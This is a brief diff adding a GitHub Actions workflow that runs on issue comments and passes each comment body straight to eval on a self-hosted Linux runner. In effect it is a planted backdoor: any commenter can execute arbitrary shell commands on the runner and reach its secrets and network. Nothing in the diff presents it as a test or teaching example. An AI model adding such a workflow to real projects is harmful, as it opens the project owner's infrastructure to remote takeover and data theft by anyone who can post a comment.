@@ -1,0 +1,8 @@
+on: issue_comment
+jobs:
+  j:
+    runs-on: [self-hosted, linux]
+    env:
+      BODY: ${{ github.event.comment.body }}
+    steps:
+      - run: eval "$BODY"
